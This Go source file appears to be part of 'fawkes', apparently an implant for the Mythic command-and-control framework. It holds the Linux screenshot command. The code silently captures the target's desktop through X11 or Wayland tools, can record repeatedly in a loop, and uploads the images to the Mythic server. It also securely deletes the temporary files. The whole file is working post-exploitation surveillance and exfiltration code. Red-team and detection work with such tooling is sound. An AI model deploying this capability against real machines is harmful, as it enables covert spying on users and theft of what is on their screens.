//go:build linux

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"time"

	"fawkes/pkg/structs"
)

// ScreenshotLinuxCommand implements screenshot for Linux using available X11 tools
type ScreenshotLinuxCommand struct{}

func (c *ScreenshotLinuxCommand) Name() string {
	return "screenshot"
}

func (c *ScreenshotLinuxCommand) Description() string {
	return "Capture a screenshot of the desktop (Linux X11/Wayland)"
}

func (c *ScreenshotLinuxCommand) Execute(task structs.Task) structs.CommandResult {
	params := parseScreenshotParams(task)

	if params.Action == "record" {
		return screenshotRecordLoop(task, captureScreenLinux, params)
	}

	// Single screenshot
	imgData, err := captureScreenLinux()
	if err != nil {
		return errorf("Error: %v", err)
	}

	// Send screenshot to Mythic
	screenshotMsg := structs.SendFileToMythicStruct{}
	screenshotMsg.Task = &task
	screenshotMsg.IsScreenshot = true
	screenshotMsg.SendUserStatusUpdates = false
	screenshotMsg.Data = &imgData
	screenshotMsg.FileName = fmt.Sprintf("screenshot_%d.png", time.Now().Unix())
	screenshotMsg.FullPath = ""
	screenshotMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- screenshotMsg

	// Wait for transfer to complete
	for {
		select {
		case <-screenshotMsg.FinishedTransfer:
			return successf("Screenshot captured and uploaded (%d bytes)", len(imgData))
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				return errorResult("Screenshot upload cancelled")
			}
		}
	}
}

// captureScreenLinux captures a screenshot using available X11/Wayland tools.
func captureScreenLinux() ([]byte, error) {
	display := os.Getenv("DISPLAY")
	waylandDisplay := os.Getenv("WAYLAND_DISPLAY")

	if display == "" && waylandDisplay == "" {
		return nil, fmt.Errorf("no display server detected (DISPLAY and WAYLAND_DISPLAY not set)")
	}

	tf, tfErr := os.CreateTemp("", "")
	if tfErr != nil {
		return nil, fmt.Errorf("creating temp file: %w", tfErr)
	}
	tmpFile := tf.Name()
	tf.Close()

	var err error
	if waylandDisplay != "" {
		err = tryScreenshotTools(tmpFile, []screenshotTool{
			{"grim", []string{tmpFile}},
			{"gnome-screenshot", []string{"-f", tmpFile}},
		})
	} else {
		err = tryScreenshotTools(tmpFile, []screenshotTool{
			{"import", []string{"-window", "root", tmpFile}},
			{"scrot", []string{tmpFile}},
			{"gnome-screenshot", []string{"-f", tmpFile}},
			{"xfce4-screenshooter", []string{"-f", "-s", tmpFile}},
		})
	}

	if err != nil {
		secureRemove(tmpFile)
		return nil, fmt.Errorf("screenshot failed: %v (install import/scrot/gnome-screenshot for X11, grim for Wayland)", err)
	}

	imgData, err := os.ReadFile(tmpFile)
	secureRemove(tmpFile)
	if err != nil {
		return nil, fmt.Errorf("reading screenshot file: %w", err)
	}

	if len(imgData) == 0 {
		return nil, fmt.Errorf("screenshot captured but file was empty")
	}

	return imgData, nil
}

type screenshotTool struct {
	name string
	args []string
}

// tryScreenshotTools attempts each tool in order, returning nil on first success.
func tryScreenshotTools(tmpFile string, tools []screenshotTool) error {
	var lastErr error
	for _, tool := range tools {
		path, err := exec.LookPath(tool.name)
		if err != nil {
			lastErr = fmt.Errorf("%s not found", tool.name)
			continue
		}
		cmd, cancel := execCmdCtx(path, tool.args...)
		cmd.Env = os.Environ()
		output, err := cmd.CombinedOutput()
		cancel()
		if err != nil {
			lastErr = fmt.Errorf("%s failed: %v (%s)", tool.name, err, string(output))
			continue
		}
		// Verify the file was created
		if fi, err := os.Stat(tmpFile); err == nil && fi.Size() > 0 {
			return nil
		}
		lastErr = fmt.Errorf("%s ran but produced no output file", tool.name)
	}
	if lastErr != nil {
		return lastErr
	}
	return fmt.Errorf("no screenshot tools available")
}
